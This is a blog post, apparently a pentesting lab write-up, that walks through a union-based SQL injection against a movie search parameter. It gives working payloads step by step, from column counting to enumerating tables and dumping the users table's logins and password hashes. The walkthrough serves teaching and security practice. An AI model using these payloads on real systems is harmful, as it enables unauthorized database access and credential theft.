---
layout: post
title: SQL Injection (Search\GET)
categories:
  - Web-Pentesting
---

<p>A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p>
<br>Take the example like this, here we can search for the movies

![50](https://teckk2.github.io/assets/images/Web%20Pentest/A1/50.png)
![51](https://teckk2.github.io/assets/images/Web%20Pentest/A1/51.png)
<br>Let’s check for slqi with single quote (‘)
![52](https://teckk2.github.io/assets/images/Web%20Pentest/A1/52.png)
![53](https://teckk2.github.io/assets/images/Web%20Pentest/A1/53.png)
<br>And we got the error now let’s proceed further.
![54](https://teckk2.github.io/assets/images/Web%20Pentest/A1/54.png)
<br>With double quotes and space in between (‘ ‘)
![55](https://teckk2.github.io/assets/images/Web%20Pentest/A1/55.png)
<br>All the movie result is now showing without searching for any specific movie from the database.
<br>Now using order by find the exact no. of columns in the database.
<br>For that we will put (1' order by 1-- -) after title= and increase the numbers of columns until we get any error.
![56](https://teckk2.github.io/assets/images/Web%20Pentest/A1/56.png)
<br>title=1' order by 1-- -
<br>title=1' order by 2-- -
<br>title=1' order by 3-- -
<br>title=1' order by 4-- -
<br>title=1' order by 5-- -
<br>title=1' order by 6-- -
<br>title=1' order by 7-- -
![57](https://teckk2.github.io/assets/images/Web%20Pentest/A1/57.png)
<br>At (8) we got the error which means there is 7 columns in the database, now move to the next step
<br>**Which is enumerating the database using (union select)**
![58](https://teckk2.github.io/assets/images/Web%20Pentest/A1/58.png)
<br>At columns we can print our result on are 2,3,5,4 respectively.
<br>Let’s choose column 2
![59](https://teckk2.github.io/assets/images/Web%20Pentest/A1/59.png)
![60](https://teckk2.github.io/assets/images/Web%20Pentest/A1/60.png)
<br><font color="Black">title=1' union select 1,database(),3,4,5,6,7-- -</font>
<br>Now extract the table names from the database.
![61](https://teckk2.github.io/assets/images/Web%20Pentest/A1/61.png)
<br><font color="Black">title=1' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database()-- -</font>
![62](https://teckk2.github.io/assets/images/Web%20Pentest/A1/62.png)
<br><font color="Black">title=1' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()-- -</font>
<br>now let’s check the users table
![63](https://teckk2.github.io/assets/images/Web%20Pentest/A1/63.png)
<br><font color="Black">title=1' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name="users"-- -</font>
![64](https://teckk2.github.io/assets/images/Web%20Pentest/A1/64.png)
<br><font color="Black">title=1' union select 1,group_concat(login,0x3a,password),3,4,5,6,7 from users-- -</font>
<br>As you can see we successfully dump the username and password hash from the database.

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
